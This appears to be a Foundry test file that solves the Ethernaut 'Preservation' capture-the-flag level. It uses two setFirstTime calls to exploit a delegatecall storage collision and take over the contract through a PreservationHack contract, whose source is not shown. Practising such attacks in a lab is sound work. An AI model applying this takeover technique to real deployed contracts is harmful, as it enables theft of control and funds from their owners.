// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import { Preservation, LibraryContract } from "../src/Preservation.sol";
import { PreservationHack } from "../src/PreservationHack.sol";

contract PreservationTest is Test {
    Preservation public preservation;
    LibraryContract public lib1;
    LibraryContract public lib2;
    PreservationHack public pHack;

    function setUp() public {
        lib1 = new LibraryContract();
        lib2 = new LibraryContract();
        preservation = new Preservation(address(lib1), address(lib2));
        pHack = new PreservationHack();
    }

    function testTakeover() public {
        preservation.setFirstTime(uint256(uint160(address(pHack))));
        preservation.setFirstTime(uint256(uint160(address(lib2))));
    }
}
